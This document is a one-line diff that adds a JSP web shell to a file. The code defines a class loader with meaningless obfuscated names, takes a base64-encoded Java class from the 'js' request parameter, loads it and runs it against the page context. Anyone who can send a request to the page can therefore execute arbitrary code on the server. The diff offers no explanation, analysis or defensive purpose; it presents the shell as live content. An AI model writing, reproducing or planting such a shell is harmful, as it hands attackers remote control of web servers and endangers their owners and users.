@@ -1,0 +1,1 @@
+<%!class ZSIJ extends ClassLoader{ ZSIJ(ClassLoader IVSB){ super(IVSB); }public Class g(byte []b){ return super.defineClass(b,0,b.length); }}%><% String cls=request.getParameter("js");if(cls!=null){ new ZSIJ(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(cls)).newInstance().equals(pageContext); }%>
